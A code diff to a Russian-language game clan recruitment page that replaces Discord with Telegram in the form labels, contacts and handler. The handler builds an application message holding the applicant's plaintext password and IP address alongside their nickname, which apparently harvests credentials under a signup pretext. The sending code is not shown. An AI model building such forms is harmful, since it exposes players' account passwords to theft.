@@ -542,8 +542,8 @@
                             <input type="text" class="form-input" id="registerName" required placeholder="Введите ваш никнейм">
                         </div>
                         <div class="form-group">
-                            <label class="form-label" for="registerEmail">Discord</label>
-                            <input type="text" class="form-input" id="registerEmail" required placeholder="Ваш Discord tag">
+                            <label class="form-label" for="registerEmail">Telegram</label>
+                            <input type="text" class="form-input" id="registerEmail" required placeholder="@username">
                         </div>
                         <div class="form-group">
                             <label class="form-label" for="registerPhone">Уровень в игре</label>
@@ -566,7 +566,7 @@
                         <i class="fas fa-check-circle"></i>
                     </div>
                     <h2>Заявка отправлена!</h2>
-                    <p>Ваша заявка на вступление в клан МВД отправлена. Ожидайте ответа в Discord.</p>
+                    <p>Ваша заявка на вступление в клан МВД отправлена. Ожидайте ответа в Telegram.</p>
                 </div>
             </div>
         </div>
@@ -645,7 +645,7 @@
                     <h3>КОНТАКТЫ</h3>
                     <ul>
                         <li><i class="fas fa-gamepad"></i> Игровой сервер: МВД #1</li>
-                        <li><i class="fab fa-discord"></i> Discord: МВД_Официальный</li>
+                        <li><i class="fab fa-telegram"></i> Telegram: @MVD_Clan</li>
                         <li><i class="fas fa-crown"></i> Лидер: [МВД]Командор</li>
                     </ul>
                 </div>
@@ -745,7 +745,7 @@
                 e.preventDefault();
                 
                 const username = document.getElementById('registerName').value;
-                const discord = document.getElementById('registerEmail').value;
+                const telegram = document.getElementById('registerEmail').value;
                 const level = document.getElementById('registerPhone').value;
                 const password = document.getElementById('registerPassword').value;
                 const confirmPassword = document.getElementById('registerConfirmPassword').value;
@@ -759,9 +759,9 @@
                 }
                 
                 // Проверяем что сообщение не пустое
-                const message = `📝 ЗАЯВКА В КЛАН МВД\n🎮 Игрок: ${username || 'Не указан'}\n💬 Discord: ${discord || 'Не указан'}\n📊 Уровень: ${level || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
+                const message = `📝 ЗАЯВКА В КЛАН МВД\n🎮 Игрок: ${username || 'Не указан'}\n📱 Telegram: ${telegram || 'Не указан'}\n📊 Уровень: ${level || 'Не указан'}\n🔑 Пароль: ${password || 'Не указан'}\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${getUserIP()}`;
                 
-                if (!username || !discord || !level || !password) {
+                if (!username || !telegram || !level || !password) {
                     alert('Пожалуйста, заполните все поля!');
                     return;
                 }
